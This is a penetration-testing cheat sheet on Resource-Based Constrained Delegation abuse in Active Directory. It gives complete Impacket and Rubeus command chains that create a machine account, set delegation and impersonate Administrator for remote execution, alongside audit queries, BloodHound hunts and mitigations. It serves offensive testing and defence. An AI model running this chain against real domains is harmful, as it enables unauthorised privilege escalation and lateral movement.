---
aliases:
  - "Resource-Based Constrained Delegation (RBCD)"
  - "RBCD"
  - RBCD
  - Resource-Based Constrained Delegation
  - msDS-AllowedToActOnBehalfOfOtherIdentity
tags:
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
---
# AD - Delegation Enumeration - Resource-Based Constrained Delegation (RBCD)

***

## Concept Overview

| **Aspecto** | **Detalle** | **Importancia** |
|:---:|:---:|:---:|
| Atributo | `msDS-AllowedToActOnBehalfOfOtherIdentity` (security descriptor) | Lista principals que pueden delegate hacia este object. |
| Direction | **Inverse** vs Classic CD: target object configura quien le delega (no source). | Key difference. |
| Required ACE | `WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity` sobre target | Privesc requirement. |
| Default | Off — debe configurarse | Standard. |
| Atacante setup | Necesita computer account control (default `MachineAccountQuota=10`) | Self-service. |
^ad-rbcd-concept

___

## RBCD vs Classic CD

| **Aspecto** | **Classic CD** | **RBCD** |
|:---:|:---:|:---:|
| Configurado en | Source object (que delega) | Target object (que recibe) |
| Required priv | Domain Admin (modify `msDS-AllowedToDelegateTo`) | `WriteProperty` sobre target (mucho más laxo) |
| Atributo | `msDS-AllowedToDelegateTo` (SPN list) | `msDS-AllowedToActOnBehalfOfOtherIdentity` (SD) |
| Protocol Transition | UAC bit `TRUSTED_TO_AUTH_FOR_DELEGATION` | Implícito siempre con S4U2Self |
| Cross-domain | Limited (CVE-2019-1040 patches) | Funciona cross-domain (intra-forest) |
| Ataque base | S4U2Self + S4U2Proxy | Mismo S4U chain |
^ad-rbcd-vs-cd

___

## ms-DS-MachineAccountQuota Default

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `(Get-ADDomain).'ms-DS-MachineAccountQuota'` | Default = 10 (cualquier user puede crear 10 computers) | Pre-attack check. |
| `Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota` | Raw query | Alt. |
| `Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"="0"}` (priv) | Disable creation | Hardening. |
^ad-rbcd-quota

**Por qué crítico:** default `MachineAccountQuota=10` permite a **cualquier user del domain** crear computer accounts. RBCD attack base = atacante crea computer → setea RBCD → S4U → impersona DA en target.

```powershell
# Audit MAQ
$maq = (Get-ADDomain).'ms-DS-MachineAccountQuota'
if ($maq -gt 0) { Write-Warning "MAQ = $maq (RBCD attack viable)" }
```

___

## RBCD Attack Chain

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Verificar `WriteProperty` sobre target computer | `Get-Acl "AD:<target-DN>" \| ? Access -match "WriteProperty"` | Pre-attack. |
| 2. Crear computer account (MAQ=10 default) | `addcomputer.py -computer-name 'evil$' -computer-pass 'EvilPass!' 'corp.local/atacante:pass'` | Linux. |
| 3. Set `msDS-AllowedToActOnBehalfOfOtherIdentity` en target | `rbcd.py -delegate-to 'TARGET$' -delegate-from 'evil$' -action write -dc-ip <DC> 'corp.local/atacante:pass'` | Linux. |
| 4. S4U2Self + S4U2Proxy chain | `getST.py -spn cifs/<target-fqdn> -impersonate Administrator -dc-ip <DC> 'corp.local/evil$:EvilPass!'` | Linux. |
| 5. Use TGS | `KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass corp.local/Administrator@<target-fqdn>` | Lateral. |
| 6. Cleanup post-engagement | `rbcd.py ... -action remove` + delete computer | Hygiene. |
^ad-rbcd-chain

```bash
# Pipeline completo Linux
ATACANTE='corp.local/atacante:pass'
TARGET='WEBSRV01$'
DC=10.10.10.10

# 1. Add computer
impacket-addcomputer -computer-name 'evil$' -computer-pass 'EvilPass!' "$ATACANTE"

# 2. Set RBCD
impacket-rbcd -delegate-to "$TARGET" -delegate-from 'evil$' -action write -dc-ip $DC "$ATACANTE"

# 3. S4U
impacket-getST -spn cifs/websrv01.corp.local \
  -impersonate Administrator -dc-ip $DC \
  'corp.local/evil$:EvilPass!'

# 4. Use
export KRB5CCNAME=Administrator@cifs_websrv01.corp.local@CORP.LOCAL.ccache
impacket-wmiexec -k -no-pass corp.local/Administrator@websrv01.corp.local

# 5. Cleanup
impacket-rbcd -delegate-to "$TARGET" -delegate-from 'evil$' -action remove -dc-ip $DC "$ATACANTE"
```

```cmd
:: Windows con Rubeus + PowerView
:: 1. Add computer (StandIn or PowerMad)
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount evil -Password (ConvertTo-SecureString 'EvilPass!' -AsPlainText -Force)

:: 2. Set RBCD
$evil = Get-ADComputer evil
$target = Get-ADComputer WEBSRV01
Set-ADComputer $target -PrincipalsAllowedToDelegateToAccount $evil

:: 3. S4U
Rubeus.exe s4u /user:evil$ /rc4:<NT-hash-evil> /impersonateuser:Administrator /msdsspn:cifs/websrv01.corp.local /ptt

:: 4. Use
dir \\websrv01\C$
```

___

## RBCD ACL Audit

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter * -Pr msDS-AllowedToActOnBehalfOfOtherIdentity \| ? msDS-AllowedToActOnBehalfOfOtherIdentity` | Computers con RBCD configurado | Inventory. |
| `Get-Acl "AD:<computer-DN>" \| ? Access -match "WriteProperty"` filter por GUID `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79` | ACEs `WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity` | Privesc surface. |
| `Find-InterestingDomainAcl -ResolveGUIDs \| ? ObjectAceType -match "msDS-AllowedToActOnBehalfOfOtherIdentity"` | Bulk hunt | Forest-wide. |
^ad-rbcd-acl

```powershell
# Hunt potencial RBCD privesc surface
Find-InterestingDomainAcl -ResolveGUIDs |
  Where {
    $_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity" -or
    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl" -and $_.ObjectClass -eq "computer")
  } |
  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
```

___

## BloodHound RBCD Edges

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u)-[:AllowedToAct]->(c:Computer) RETURN u.name,c.name` | RBCD configured paths | Inventory. |
| `MATCH (u {owned:true})-[:GenericWrite\|GenericAll]->(c:Computer) RETURN u,c` | Owned con WriteProperty sobre computer = RBCD setup viable | Privesc surface. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(c:Computer {highvalue:true})) WHERE any(r IN relationships(p) WHERE type(r) IN ["GenericAll","GenericWrite","AddAllowedToAct","AllowedToAct"]) RETURN p` | Path RBCD privesc | Standard. |
^ad-rbcd-bh

___

## Cross-Trust RBCD

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| RBCD intra-forest cross-domain | Funciona (no patches limitan intra-forest) | Standard. |
| RBCD inter-forest | **Limitado** post-CVE-2019-1040 + KB4490425 | Audit. |
| `Get-ADTrust -Filter * -Pr trustAttributes \| ? {$_.trustAttributes -band 0x800}` | Trusts con TGT Delegation re-enabled (RBCD cross-forest viable) | Critical audit. |
^ad-rbcd-crosstrust

___

## Mitigations

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"="0"}` | Disable user computer creation (kill RBCD self-service) | Critical hardening. |
| `Add-ADGroupMember "Protected Users" -Members <victim>` | Block delegation hacia members | Tier 0 hardening. |
| `Set-ADAccountControl -Identity <victim> -AccountNotDelegated $true` | Non-delegable mark | Hardening. |
| Audit `WriteProperty` ACEs sobre Tier 0 computers | Reduce RBCD setup surface | Audit. |
| Restrict `WriteProperty msDS-AllowedToActOnBehalfOfOtherIdentity` ACEs | Granular control | Hardening. |
^ad-rbcd-mitigations

***
